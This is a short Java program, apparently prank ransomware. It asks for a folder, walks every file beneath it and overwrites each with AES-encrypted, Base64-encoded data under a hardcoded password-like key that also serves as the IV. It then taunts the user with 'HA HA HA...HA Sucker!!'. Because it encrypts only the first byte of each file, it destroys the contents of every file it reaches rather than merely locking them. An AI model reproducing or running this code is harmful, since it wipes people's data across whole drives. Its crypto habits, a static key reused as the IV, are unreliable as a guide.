import sun.misc.BASE64Encoder;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.io.*;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;

public class Run implements FileVisitor<Path> {
    static String strpassword="password12345678";
    static SecretKeySpec key =new SecretKeySpec(strpassword.getBytes(),"AES");

    @Override
    public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
        AlgorithmParameterSpec spec= new IvParameterSpec(strpassword.getBytes());
        try {
            Cipher cipher= Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE,key,spec);
            FileReader stream =new FileReader(file.toFile());
            byte input =(byte) stream.read();
            byte[] encrypted=cipher.doFinal(new byte[]{input});
            String output =new BASE64Encoder().encode(encrypted);
            FileWriter outputStream=new FileWriter(file.toFile());
            outputStream.write(output);
            stream.close();
            outputStream.close();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
        return FileVisitResult.CONTINUE;
    }
    public static void main(String[] args) {

        Run run =new Run();
        try {
            String ph =JOptionPane.showInputDialog(null,"select a file","C:/");
            Path pah= Paths.get(ph);
            Files.walkFileTree(pah,run);
            JOptionPane.showMessageDialog(null,"HA HA HA...HA\n Sucker!!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
